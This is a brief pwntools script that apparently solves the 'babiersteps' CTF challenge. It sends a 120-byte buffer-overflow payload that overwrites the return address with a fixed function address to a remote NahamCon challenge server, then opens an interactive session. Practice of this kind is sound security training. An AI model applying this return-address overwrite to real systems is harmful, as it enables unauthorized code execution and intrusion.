from pwn import *

def test_local():
    p = process('./babiersteps')
    return p

def test_remote():
    p = remote('challenge.nahamcon.com', 31460)
    return p

buffer = b'a'*(112+8)
eip = p64(0x4011c9)
payload = buffer + eip

p = test_remote()
out = p.recvuntil('?')
print(out)
print(payload)
p.sendline(payload)
p.interactive()